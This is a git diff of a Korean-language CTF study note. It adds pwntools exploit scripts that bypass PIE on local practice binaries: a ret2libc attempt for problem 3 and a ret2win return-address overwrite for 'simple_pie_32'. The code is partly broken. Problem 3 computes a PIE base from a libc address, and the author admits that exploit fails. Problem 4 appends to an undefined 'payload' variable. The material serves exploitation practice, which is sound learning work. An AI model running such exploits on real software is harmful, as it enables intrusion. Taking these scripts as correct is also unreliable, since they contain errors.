@@ -41,7 +41,10 @@ printf_addr = int(p.recv(14), 16)
 libc_base = printf_addr - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
-pop_rdi = libc_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
+
+pie_base = printf_addr - 0x1040
+
+pop_rdi = pie_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
 
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
@@ -61,7 +64,7 @@ p.interactive()
 
 ```
 
-익스플로잇이 되지 않는다. rop gadget은 PIE로 랜덤화되기 때문에 libc base를 같이 사용하면 안 되기 때문인가? 잘 모르겠다...ㅜㅜ
+익스플로잇이 되지 않는다. rop gadget은 PIE로 랜덤화되기 때문에 libc base를 같이 사용하면 안 되기 때문인가? 잘 모르겠다...ㅜㅜ 풀지 못했다.
 
 
 
@@ -74,6 +77,33 @@ p.interactive()
 
 ## problem 4
 
+pie를 우회하는 문제이다. main addr에서 main의 offset을 빼서 pie base를 구한 뒤 win의 실제 주소를 구하고 그것을 ret에 덮어쓰면 된다.
+
+
+```python
+
+from pwn import *
+
+p = process('./simple_pie_32')
+e = ELF('./simple_pie_32')
+libc = e.libc
+rop = ROP(e)
+
+p.recvuntil(b'at : 0x')
+main_addr = int(p.recvline(), 16)
+pie_base = main_addr - 0x122d
+win_addr = pie_base + 0x1291
+
+payload += b'A'*0x1c
+payload += b'A'*0x4
+payload += p32(win_addr)
+
+
+p.sendline(payload)
+
+p.interactive()
+
+```
 
 
 
